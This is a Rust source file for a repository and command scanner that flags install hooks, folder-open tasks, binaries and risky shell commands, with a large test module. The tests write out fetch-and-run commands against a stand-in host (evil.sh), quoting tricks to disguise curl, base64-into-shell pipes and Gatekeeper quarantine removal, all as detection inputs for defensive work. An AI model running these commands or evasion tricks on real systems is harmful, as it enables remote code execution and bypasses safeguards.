use std::collections::HashSet;
use std::fs::{self, File};
use std::io::Read;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};

use ignore::WalkBuilder;

use crate::allow::Allowlists;
use crate::command;
use crate::download::{self, DownloadError, DownloadStatus, MacTools};
use crate::llm::{self, LlmMode, LlmOutcome};
use crate::osv::{self, Cache, OsvClient, OsvMode, RULE_IDS};
use crate::report::{Report, SkipReason, Skipped};
use crate::rules::{HEAD_BYTES, RuleError, RuleSet, Target};

/// Files above this size are not read: rules look at manifests and scripts, and a hostile repo
/// must not be able to make a scan allocate without bound.
const MAX_FILE_BYTES: u64 = 1024 * 1024;

#[derive(Debug, thiserror::Error)]
pub enum ScanError {
    #[error("{0} is not a directory")]
    NotADirectory(String),
}

fn read_target(path: &Path) -> Result<String, SkipReason> {
    let len = fs::metadata(path)
        .map_err(|_| SkipReason::Unreadable)?
        .len();
    if len > MAX_FILE_BYTES {
        return Err(SkipReason::TooLarge);
    }
    let bytes = fs::read(path).map_err(|_| SkipReason::Unreadable)?;
    Ok(String::from_utf8_lossy(&bytes).into_owned())
}

fn read_head(path: &Path) -> Vec<u8> {
    let mut head = [0u8; HEAD_BYTES];
    let read = File::open(path)
        .and_then(|mut f| f.read(&mut head))
        .unwrap_or(0);
    head[..read].to_vec()
}

#[cfg(unix)]
fn is_executable(metadata: &fs::Metadata) -> bool {
    use std::os::unix::fs::PermissionsExt;
    metadata.permissions().mode() & 0o111 != 0
}

#[cfg(not(unix))]
fn is_executable(_: &fs::Metadata) -> bool {
    false
}

/// A symlink that does not resolve inside the scanned root: the walker must not read through
/// it, and the scan reports it afterwards instead of dropping it.
fn leaves_root(root: &Path, link: &Path) -> bool {
    link.canonicalize()
        .map_or(true, |target| !target.starts_with(root))
}

/// The path a walk error belongs to, when the walker said.
fn error_target(err: &ignore::Error) -> Option<&Path> {
    match err {
        ignore::Error::WithPath { path, .. } => Some(path),
        ignore::Error::WithDepth { err, .. } | ignore::Error::WithLineNumber { err, .. } => {
            error_target(err)
        }
        _ => None,
    }
}

/// The path a walk error belongs to, relative to the scanned root, or "." when the walker did
/// not say.
pub(crate) fn error_path(err: &ignore::Error, root: &Path) -> String {
    error_target(err).map_or(".".into(), |path| {
        path.strip_prefix(root)
            .unwrap_or(path)
            .to_string_lossy()
            .into_owned()
    })
}

/// What the OSV layer needs: how to behave, where to ask and where to remember.
pub struct OsvSetup<'a> {
    pub mode: OsvMode,
    pub client: &'a dyn OsvClient,
    pub cache: &'a Cache,
}

pub struct Engine {
    rules: RuleSet,
}

impl Engine {
    pub fn new(rules: RuleSet) -> Self {
        Self { rules }
    }

    pub fn embedded() -> Result<Self, RuleError> {
        Ok(Self::new(RuleSet::embedded()?))
    }

    /// Scans a repository without executing anything in it. A symlink that resolves inside the
    /// scanned root is followed, because npm and VS Code follow it, and is named by its link
    /// path; one that resolves outside it is not read but reported. `.gitignore` is not honoured
    /// (ignored files still run on the developer's machine) and only `.git` is skipped. A file a
    /// rule targets that cannot be read is reported in the `skipped` list and as a warning,
    /// never silently dropped.
    pub fn scan_dir(&self, dir: &Path) -> Result<Report, ScanError> {
        self.scan_dir_with(dir, &Allowlists::empty())
    }

    /// Like `scan_dir`, then hides the findings `allow` allows; they stay listed in the report.
    /// The OSV layer is off.
    pub fn scan_dir_with(&self, dir: &Path, allow: &Allowlists) -> Result<Report, ScanError> {
        self.scan_dir_osv(dir, allow, None)
    }

    /// Like `scan_dir_with`, and with `osv` set also checks the lockfiles for known
    /// vulnerabilities. The OSV findings go through the allowlists with the rest.
    pub fn scan_dir_osv(
        &self,
        dir: &Path,
        allow: &Allowlists,
        osv: Option<&OsvSetup<'_>>,
    ) -> Result<Report, ScanError> {
        self.scan_dir_full(dir, allow, osv, LlmMode::Off)
    }

    /// Like `scan_dir_osv`, and with `llm` on also asks a model to review a bounded selection of
    /// files. Its findings are added after the allowlists run: they never hide or change what
    /// the other layers found, and an allowlist cannot hide them.
    pub fn scan_dir_full(
        &self,
        dir: &Path,
        allow: &Allowlists,
        osv: Option<&OsvSetup<'_>>,
        llm: LlmMode<'_>,
    ) -> Result<Report, ScanError> {
        if !dir.is_dir() {
            return Err(ScanError::NotADirectory(dir.display().to_string()));
        }
        let root = dir
            .canonicalize()
            .map_err(|_| ScanError::NotADirectory(dir.display().to_string()))?;
        let escaped = Arc::new(Mutex::new(Vec::<PathBuf>::new()));
        let walker = WalkBuilder::new(dir)
            .standard_filters(false)
            .follow_links(true)
            .filter_entry({
                let escaped = Arc::clone(&escaped);
                let root = root.clone();
                move |e| {
                    if e.file_name() == ".git" {
                        return false;
                    }
                    if e.path_is_symlink() && leaves_root(&root, e.path()) {
                        escaped.lock().unwrap().push(e.path().to_path_buf());
                        return false;
                    }
                    true
                }
            })
            .build();
        let mut findings = Vec::new();
        let mut skipped = Vec::new();
        for entry in walker {
            let entry = match entry {
                Ok(entry) => entry,
                Err(err) => {
                    let dangling =
                        error_target(&err).filter(|p| p.is_symlink() && p.canonicalize().is_err());
                    if let Some(link) = dangling {
                        escaped.lock().unwrap().push(link.to_path_buf());
                        continue;
                    }
                    skipped.push(Skipped {
                        path: error_path(&err, dir),
                        reason: SkipReason::WalkError,
                    });
                    continue;
                }
            };
            if !entry.file_type().is_some_and(|t| t.is_file()) {
                continue;
            }
            let rel = entry.path().strip_prefix(dir).unwrap_or(entry.path());
            let wanted = self.repo_rules_for(rel);
            if wanted.is_empty() {
                continue;
            }
            let (binary_rules, text_rules): (Vec<_>, Vec<_>) =
                wanted.into_iter().partition(|r| r.is_binary_rule());
            let mut claimed_binary = false;
            if !binary_rules.is_empty() {
                let head = read_head(entry.path());
                let executable = entry.metadata().is_ok_and(|m| is_executable(&m));
                findings.extend(
                    binary_rules
                        .iter()
                        .flat_map(|r| r.check_head(rel, &head, executable)),
                );
                claimed_binary = binary_rules.iter().any(|r| r.claims_binary(&head));
            }
            if text_rules.is_empty() {
                continue;
            }
            match read_target(entry.path()) {
                Ok(content) => {
                    findings.extend(text_rules.iter().flat_map(|r| r.check_file(rel, &content)));
                }
                Err(_) if claimed_binary => {}
                Err(reason) => skipped.push(Skipped {
                    path: rel.to_string_lossy().into_owned(),
                    reason,
                }),
            }
        }
        let outcome = osv.map(|o| osv::run(osv::discover(dir), o.mode, o.client, o.cache));
        let status = outcome.as_ref().map(|o| o.status.clone());
        findings.extend(outcome.into_iter().flat_map(|o| o.findings));
        let escaped = std::mem::take(&mut *escaped.lock().unwrap());
        for link in escaped {
            let rel = link.strip_prefix(dir).unwrap_or(&link);
            let resolved = fs::metadata(&link);
            let reason = match &resolved {
                Ok(_) => SkipReason::SymlinkOutsideRepo,
                Err(_) => SkipReason::Unreadable,
            };
            let is_dir = resolved.is_ok_and(|m| m.is_dir());
            let read_by_text_rule = self.repo_rules_for(rel).iter().any(|r| !r.is_binary_rule());
            if is_dir || read_by_text_rule {
                skipped.push(Skipped {
                    path: rel.to_string_lossy().into_owned(),
                    reason,
                });
            }
        }
        let applied = allow.apply(findings, &self.known_rule_ids());
        let llm = match llm {
            LlmMode::Off => None,
            LlmMode::Skipped(why) => Some(LlmOutcome::Skipped(why)),
            LlmMode::On(provider) => Some(llm::run(dir, &applied.kept, provider)),
        };
        let report = Report::from_scan(applied.kept, skipped)
            .with_allowlist(applied.suppressed, applied.warnings);
        let report = match status {
            Some(status) => report.with_osv(status),
            None => report,
        };
        Ok(match llm {
            Some(outcome) => report.with_llm(outcome),
            None => report,
        })
    }

    fn repo_rules_for(&self, rel: &Path) -> Vec<&crate::rules::Rule> {
        self.rules
            .rules()
            .iter()
            .filter(|r| r.target() == Target::Repo && r.applies_to(rel))
            .collect()
    }

    fn known_rule_ids(&self) -> HashSet<String> {
        let rust_rules = command::RULES.iter().map(|r| r.id.to_string());
        self.rules
            .rules()
            .iter()
            .map(|r| r.id.clone())
            .chain(rust_rules)
            .chain(RULE_IDS.iter().map(|id| id.to_string()))
            .chain(download::RULE_IDS.iter().map(|id| id.to_string()))
            .collect()
    }

    /// Checks a downloaded file. `tools` is `None` where the layer is not available (not macOS):
    /// the report then says the layer was skipped and carries a warning finding, never a pass.
    pub fn check_download(
        &self,
        path: &Path,
        tools: Option<&dyn MacTools>,
        allow: &Allowlists,
    ) -> Result<Report, DownloadError> {
        let subject = download::subject(path)?;
        let (findings, status) = match tools {
            Some(tools) => (download::analyze(&subject, tools), DownloadStatus::Ran),
            None => (
                vec![download::unavailable(&subject)],
                DownloadStatus::Skipped("macOS only".into()),
            ),
        };
        let applied = allow.apply(findings, &self.known_rule_ids());
        Ok(Report::from_download(applied.kept, status)
            .with_allowlist(applied.suppressed, applied.warnings))
    }

    pub fn check_command(&self, command: &str) -> Report {
        self.check_command_with(command, &Allowlists::empty())
    }

    /// Like `check_command`, then hides the findings `allow` allows; they stay listed in the report.
    pub fn check_command_with(&self, command: &str, allow: &Allowlists) -> Report {
        let macos = cfg!(target_os = "macos");
        let mut findings: Vec<_> = self
            .rules
            .rules()
            .iter()
            .filter(|r| r.target() == Target::Command)
            .flat_map(|r| r.check_command(command))
            .collect();
        findings.extend(command::analyze(command, macos));
        command::stamp_fetch_domain(&mut findings, command);
        let applied = allow.apply(findings, &self.known_rule_ids());
        Report::from_rules(applied.kept)
            .with_skipped_rules(command::skipped_rules(macos))
            .with_allowlist(applied.suppressed, applied.warnings)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn allow_domain_as_user(rule: &str, domain: &str) -> Allowlists {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir(dir.path().join("code-watch")).unwrap();
        fs::write(
            dir.path().join("code-watch/allow.toml"),
            format!("schema = 1\n[[allow]]\nrule = \"{rule}\"\ndomain = \"{domain}\"\n"),
        )
        .unwrap();
        Allowlists::load(Some(dir.path()), None).unwrap()
    }

    fn allow_domain(rule: &str, domain: &str) -> Allowlists {
        allow_domain_as_user(rule, domain)
    }

    fn check(command: &str, allow: &Allowlists) -> Report {
        Engine::embedded()
            .unwrap()
            .check_command_with(command, allow)
    }

    fn rule_ids(command: &str) -> Vec<String> {
        check(command, &Allowlists::empty())
            .findings()
            .iter()
            .map(|f| f.rule_id.clone())
            .collect()
    }

    #[test]
    fn quoting_tricks_get_the_same_finding_as_the_plain_form() {
        let plain = rule_ids("curl https://evil.sh/a | sh");
        assert_eq!(plain, ["command/pipe-to-shell"]);
        for cmd in [
            r"c\url https://evil.sh/a | sh",
            r#"cu""rl https://evil.sh/a | sh"#,
            "cu''rl https://evil.sh/a | sh",
            r"curl https://evil.sh/a | s\h",
            r"sh -c 'c\url https://evil.sh/a | s\h'",
        ] {
            assert_eq!(rule_ids(cmd), plain, "{cmd}");
        }
    }

    #[test]
    fn quoting_tricks_hit_every_whole_string_rule() {
        assert_eq!(
            rule_ids(r"echo aGk= | ba''se64 -d | b\ash"),
            ["command/base64-into-shell"]
        );
        assert_eq!(
            rule_ids(r"xa\ttr -d com.apple.quarantine A.app"),
            ["command/quarantine-removal"]
        );
    }

    #[test]
    fn a_finding_matched_raw_and_unquoted_is_reported_once() {
        assert_eq!(
            rule_ids("curl https://evil.sh/a | sh; c\\url https://evil.sh/b | sh"),
            ["command/pipe-to-shell"]
        );
    }

    #[test]
    fn a_quoted_operator_is_text_not_a_pipe() {
        assert!(rule_ids("echo 'curl x | sh'").is_empty());
        assert!(rule_ids("echo 'cu''rl x | sh'").is_empty());
        assert!(rule_ids("echo 'c\\url x ; sh'").is_empty());
    }

    #[test]
    fn an_unbalanced_quote_does_not_panic_and_is_reported() {
        for cmd in ["curl https://evil.sh/a | sh 'oops", "c\\url 'oops | sh"] {
            assert_eq!(rule_ids(cmd), ["command/unparsable"], "{cmd}");
        }
    }

    #[test]
    fn fetch_and_run_without_a_pipe_gives_the_pipe_to_shell_finding_once() {
        for cmd in [
            r#"sh -c "$(curl -fsSL https://evil.sh/a)""#,
            r#"/bin/bash -c "$(c\url -fsSL https://evil.sh/a)""#,
            r#"eval "$(curl -fsSL https://evil.sh/a)""#,
            "bash <(curl -s https://evil.sh/a)",
            "source <(curl -s https://evil.sh/a)",
            ". <(curl -s https://evil.sh/a)",
            "curl -s https://evil.sh/a | python3",
            r#"sh -c "$(curl https://evil.sh/a | sh)""#,
        ] {
            assert_eq!(rule_ids(cmd), ["command/pipe-to-shell"], "{cmd}");
        }
        assert!(rule_ids("curl -s https://evil.sh/a | python3 tool.py").is_empty());
    }

    #[test]
    fn a_domain_entry_covers_a_fetch_and_run_without_a_pipe() {
        let allow = allow_domain("command/pipe-to-shell", "example.org");
        let r = check(r#"sh -c "$(curl -fsSL https://example.org/a)""#, &allow);
        assert!(r.findings().is_empty());
        let r = check(r#"sh -c "$(curl -fsSL https://evil.sh/a)""#, &allow);
        assert_eq!(r.findings().len(), 1);
    }

    #[test]
    fn a_domain_entry_does_not_hide_a_quoted_fetch() {
        let allow = allow_domain("command/pipe-to-shell", "example.org");
        let r = check(r"c\url https://example.org/a | sh", &allow);
        assert_eq!(r.findings().len(), 1);
    }

    #[test]
    fn a_domain_entry_suppresses_the_pipe_to_shell_warning_for_that_host() {
        let allow = allow_domain("command/pipe-to-shell", "example.org");
        let r = check("curl -fsSL -o x.sh https://example.org/i.sh | sh", &allow);
        assert!(r.findings().is_empty());
        assert_eq!(
            r.suppressed()[0].finding.domain.as_deref(),
            Some("example.org")
        );
    }

    #[test]
    fn a_domain_in_the_query_of_another_host_does_not_suppress() {
        let allow = allow_domain("command/pipe-to-shell", "example.org");
        let r = check("curl https://evil.sh/x?example.org | sh", &allow);
        assert_eq!(r.findings()[0].rule_id, "command/pipe-to-shell");
        assert!(r.suppressed().is_empty());
    }

    #[test]
    fn a_command_fetching_two_hosts_has_no_domain_to_match() {
        let allow = allow_domain("command/pipe-to-shell", "example.org");
        let r = check("curl https://example.org/a https://zzz.sh/b | sh", &allow);
        assert_eq!(r.findings().len(), 1);
    }

    #[test]
    fn a_host_inside_a_subshell_counts_as_a_second_host() {
        let allow = allow_domain("command/pipe-to-shell", "example.org");
        let r = check(
            "curl https://example.org/a | sh -c \"curl https://evil.sh/b\"",
            &allow,
        );
        assert_eq!(r.findings().len(), 1);
    }

    #[test]
    fn a_domain_entry_never_hides_a_finding_that_is_not_about_the_fetch() {
        let allow = allow_domain_as_user("command/base64-into-shell", "example.org");
        for cmd in [
            "curl https://example.org/x -o f; echo ZXZpbA== | base64 -d | sh",
            "curl https://example.org/x -o f ; echo ZXZpbA== | base64 -d | sh",
        ] {
            let r = check(cmd, &allow);
            assert_eq!(r.verdict(), crate::report::Verdict::Block, "{cmd}");
            assert!(r.suppressed().is_empty(), "{cmd}");
        }
    }

    #[test]
    fn a_domain_entry_does_not_hide_a_command_that_may_fetch_another_host() {
        let allow = allow_domain("command/pipe-to-shell", "example.org");
        for cmd in [
            "curl evil.sh https://example.org/a | sh",
            "curl --url evil.sh https://example.org/a | sh",
            "curl -K cfg https://example.org/a | sh",
            "wget -i list.txt -O- https://example.org/a | sh",
            "curl https://example.org/a | sh; curl evil.sh | sh",
            "curl https://example.org/a | sh -c \"$(curl evil.sh)\"",
        ] {
            let r = check(cmd, &allow);
            assert_ne!(r.verdict(), crate::report::Verdict::Allow, "{cmd}");
            assert!(r.suppressed().is_empty(), "{cmd}");
        }
    }

    #[test]
    fn a_subdomain_is_not_covered_by_its_parent_entry() {
        let allow = allow_domain("command/pipe-to-shell", "example.org");
        let r = check("curl https://cdn.example.org/i.sh | sh", &allow);
        assert_eq!(r.findings().len(), 1);
    }

    #[test]
    fn the_lookalike_finding_keeps_its_own_host_when_the_command_fetches_two() {
        let r = check(
            "curl https://githab.com/i.sh https://example.org/x | sh",
            &Allowlists::empty(),
        );
        let f = r
            .findings()
            .iter()
            .find(|f| f.rule_id == "command/lookalike-download-domain");
        assert_eq!(f.and_then(|f| f.domain.as_deref()), Some("githab.com"));
    }

    #[test]
    fn the_lookalike_finding_carries_its_host() {
        let r = check("curl https://githab.com/i.sh | sh", &Allowlists::empty());
        let f = r
            .findings()
            .iter()
            .find(|f| f.rule_id == "command/lookalike-download-domain");
        assert_eq!(f.and_then(|f| f.domain.as_deref()), Some("githab.com"));
    }

    #[test]
    fn a_suppressed_finding_changes_the_verdict_not_the_layers() {
        let allow = allow_domain("command/pipe-to-shell", "example.org");
        let r = check("curl https://example.org/i.sh | sh", &allow);
        assert_eq!(r.verdict(), crate::report::Verdict::Allow);
        assert_eq!(r.layers(), check("ls", &Allowlists::empty()).layers());
    }

    #[test]
    fn a_repo_scan_applies_the_repo_file_and_the_user_dir() {
        let user = tempfile::tempdir().unwrap();
        fs::create_dir(user.path().join("code-watch")).unwrap();
        fs::write(
            user.path().join("code-watch/allow.toml"),
            "schema = 1\n[[allow]]\nrule = \"repo/vscode-folderopen-task\"\n",
        )
        .unwrap();
        let repo = tempfile::tempdir().unwrap();
        fs::create_dir(repo.path().join(".vscode")).unwrap();
        fs::write(
            repo.path().join(".vscode/tasks.json"),
            r#"{"tasks":[{"runOptions":{"runOn":"folderOpen"}}]}"#,
        )
        .unwrap();
        fs::write(
            repo.path().join("package.json"),
            r#"{"scripts":{"postinstall":"x"}}"#,
        )
        .unwrap();
        fs::write(
            repo.path().join(".code-watch.toml"),
            "schema = 1\n[[allow]]\nrule = \"repo/npm-lifecycle-script\"\npath = \"package.json\"\n\
             [[allow]]\nrule = \"repo/vscode-folderopen-task\"\n",
        )
        .unwrap();
        let engine = Engine::embedded().unwrap();
        let blocked = engine
            .scan_dir_with(
                repo.path(),
                &Allowlists::load(None, Some(repo.path())).unwrap(),
            )
            .unwrap();
        assert!(
            blocked
                .findings()
                .iter()
                .any(|f| f.rule_id == "allowlist/repo-block-override-refused")
        );
        let allow = Allowlists::load(Some(user.path()), Some(repo.path())).unwrap();
        let r = engine.scan_dir_with(repo.path(), &allow).unwrap();
        assert!(r.findings().is_empty(), "{:?}", r.findings());
        assert_eq!(r.suppressed().len(), 2);
    }

    #[test]
    fn scanning_a_missing_directory_is_an_error() {
        let engine = Engine::embedded().unwrap();
        assert!(engine.scan_dir(Path::new("/definitely/not/here")).is_err());
    }

    #[test]
    fn git_internals_are_not_scanned() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir(dir.path().join(".git")).unwrap();
        fs::write(
            dir.path().join(".git/package.json"),
            r#"{"scripts":{"postinstall":"echo hi"}}"#,
        )
        .unwrap();
        let report = Engine::embedded().unwrap().scan_dir(dir.path()).unwrap();
        assert!(report.findings().is_empty());
    }

    #[cfg(unix)]
    fn link(target: &Path, at: &Path) {
        std::os::unix::fs::symlink(target, at).unwrap();
    }

    const POSTINSTALL: &str = r#"{"scripts":{"postinstall":"echo hi"}}"#;

    #[cfg(unix)]
    #[test]
    fn a_file_link_inside_the_root_is_read_and_named_by_the_link() {
        let repo = tempfile::tempdir().unwrap();
        fs::create_dir(repo.path().join("data")).unwrap();
        fs::write(repo.path().join("data/a.txt"), POSTINSTALL).unwrap();
        link(Path::new("data/a.txt"), &repo.path().join("package.json"));
        let report = scan(repo.path());
        let hit = &report.findings()[0];
        assert_eq!(hit.rule_id, "repo/npm-lifecycle-script");
        assert_eq!(hit.evidence.file.as_deref(), Some("package.json"));
        assert!(report.skipped().is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn a_directory_link_inside_the_root_is_followed() {
        let repo = tempfile::tempdir().unwrap();
        fs::create_dir(repo.path().join("x")).unwrap();
        fs::write(
            repo.path().join("x/tasks.json"),
            r#"{"tasks":[{"runOptions":{"runOn":"folderOpen"}}]}"#,
        )
        .unwrap();
        link(Path::new("x"), &repo.path().join(".vscode"));
        let report = scan(repo.path());
        let files: Vec<_> = report
            .findings()
            .iter()
            .filter(|f| f.rule_id == "repo/vscode-folderopen-task")
            .filter_map(|f| f.evidence.file.as_deref())
            .collect();
        assert_eq!(files, [".vscode/tasks.json"]);
    }

    #[cfg(unix)]
    #[test]
    fn a_file_link_leaving_the_root_is_reported_not_dropped() {
        let outside = tempfile::tempdir().unwrap();
        fs::write(outside.path().join("package.json"), POSTINSTALL).unwrap();
        let repo = tempfile::tempdir().unwrap();
        link(
            &outside.path().join("package.json"),
            &repo.path().join("package.json"),
        );
        let report = scan(repo.path());
        assert_unscanned(&report, "package.json", SkipReason::SymlinkOutsideRepo);
    }

    #[cfg(unix)]
    #[test]
    fn a_directory_link_leaving_the_root_is_reported_not_dropped() {
        let outside = tempfile::tempdir().unwrap();
        fs::write(outside.path().join("tasks.json"), "{}").unwrap();
        let repo = tempfile::tempdir().unwrap();
        link(outside.path(), &repo.path().join(".vscode"));
        let report = scan(repo.path());
        assert_unscanned(&report, ".vscode", SkipReason::SymlinkOutsideRepo);
    }

    #[cfg(unix)]
    #[test]
    fn a_dangling_targeted_link_is_reported_and_an_untargeted_one_is_not() {
        let repo = tempfile::tempdir().unwrap();
        link(Path::new("missing"), &repo.path().join("package.json"));
        link(Path::new("missing"), &repo.path().join("notes.txt"));
        let report = scan(repo.path());
        assert_unscanned(&report, "package.json", SkipReason::Unreadable);
    }

    #[cfg(unix)]
    #[test]
    fn a_link_loop_is_reported() {
        let repo = tempfile::tempdir().unwrap();
        link(Path::new("b"), &repo.path().join("a"));
        link(Path::new("a"), &repo.path().join("b"));
        link(Path::new("loop"), &repo.path().join("package.json"));
        link(Path::new("package.json"), &repo.path().join("loop"));
        let report = scan(repo.path());
        assert_ne!(report.verdict(), crate::report::Verdict::Allow);
    }

    #[cfg(unix)]
    #[test]
    fn a_root_that_is_itself_a_symlink_still_follows_inside_links() {
        let real = tempfile::tempdir().unwrap();
        fs::write(real.path().join("a.txt"), POSTINSTALL).unwrap();
        link(Path::new("a.txt"), &real.path().join("package.json"));
        let holder = tempfile::tempdir().unwrap();
        let root_link = holder.path().join("repo");
        link(real.path(), &root_link);
        let report = scan(&root_link);
        assert_eq!(report.findings()[0].rule_id, "repo/npm-lifecycle-script");
        assert!(report.skipped().is_empty());
    }

    fn scan(dir: &Path) -> Report {
        Engine::embedded().unwrap().scan_dir(dir).unwrap()
    }

    fn assert_unscanned(report: &Report, path: &str, reason: SkipReason) {
        assert_eq!(
            report.skipped(),
            [Skipped {
                path: path.into(),
                reason
            }]
        );
        assert!(
            report
                .findings()
                .iter()
                .any(|f| f.rule_id == "repo/unscanned-target")
        );
        assert_eq!(report.verdict(), crate::report::Verdict::Warn);
    }

    #[test]
    fn an_oversized_target_is_reported_not_allowed() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir(dir.path().join(".vscode")).unwrap();
        let pad = " ".repeat(MAX_FILE_BYTES as usize);
        fs::write(
            dir.path().join(".vscode/tasks.json"),
            format!(r#"{{"tasks":[{{"runOptions":{{"runOn":"folderOpen"}}}}]}}{pad}"#),
        )
        .unwrap();
        let report = scan(dir.path());
        assert_unscanned(&report, ".vscode/tasks.json", SkipReason::TooLarge);
    }

    #[test]
    fn a_large_file_no_rule_targets_is_not_reported() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("data.bin"),
            vec![b'x'; MAX_FILE_BYTES as usize + 1],
        )
        .unwrap();
        let report = scan(dir.path());
        assert!(report.skipped().is_empty() && report.findings().is_empty());
    }

    #[test]
    fn a_non_utf8_byte_does_not_stop_the_text_rules() {
        let dir = tempfile::tempdir().unwrap();
        let mut script = b"echo aGk= | base64 -d | sh\n# \xff\n".to_vec();
        script.push(0xfe);
        fs::write(dir.path().join("install.sh"), script).unwrap();
        let report = scan(dir.path());
        assert!(report.skipped().is_empty());
        assert_eq!(report.findings()[0].rule_id, "repo/base64-into-shell");
        assert_eq!(report.verdict(), crate::report::Verdict::Block);
    }

    #[test]
    fn a_bom_prefixed_package_json_is_still_checked() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("package.json"),
            "\u{feff}{\"scripts\":{\"postinstall\":\"echo hi\"}}",
        )
        .unwrap();
        let report = scan(dir.path());
        assert!(report.skipped().is_empty());
        assert_eq!(report.findings()[0].rule_id, "repo/npm-lifecycle-script");
    }

    #[cfg(unix)]
    fn deny(path: &Path, mode: u32) {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(path, fs::Permissions::from_mode(mode)).unwrap();
    }

    #[cfg(unix)]
    #[test]
    fn an_unreadable_target_is_reported() {
        let dir = tempfile::tempdir().unwrap();
        let file = dir.path().join("package.json");
        fs::write(&file, "{}").unwrap();
        deny(&file, 0o000);
        let report = scan(dir.path());
        deny(&file, 0o644);
        assert_unscanned(&report, "package.json", SkipReason::Unreadable);
    }

    #[cfg(unix)]
    #[test]
    fn an_unreadable_directory_is_reported() {
        let dir = tempfile::tempdir().unwrap();
        let sub = dir.path().join("sub");
        fs::create_dir(&sub).unwrap();
        fs::write(sub.join("package.json"), "{}").unwrap();
        deny(&sub, 0o000);
        let report = scan(dir.path());
        deny(&sub, 0o755);
        assert_unscanned(&report, "sub", SkipReason::WalkError);
    }

    #[test]
    fn a_binary_is_reported_once_and_not_as_unreadable() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join("payload.py"), b"\x7fELF\x00\xff").unwrap();
        let report = Engine::embedded().unwrap().scan_dir(dir.path()).unwrap();
        let hits = report
            .findings()
            .iter()
            .filter(|f| f.rule_id == "repo/committed-binary")
            .count();
        assert_eq!(hits, 1);
        assert!(report.skipped().is_empty());
    }

    #[test]
    fn a_script_starting_with_mz_is_still_scanned_as_text() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("x.sh"),
            "MZ=1; echo aGk= | base64 -d | sh\n",
        )
        .unwrap();
        fs::write(dir.path().join("n.txt"), "MZ notes\n").unwrap();
        let report = Engine::embedded().unwrap().scan_dir(dir.path()).unwrap();
        let ids: Vec<_> = report
            .findings()
            .iter()
            .map(|f| f.rule_id.as_str())
            .collect();
        assert_eq!(ids, ["repo/base64-into-shell"]);
    }
}
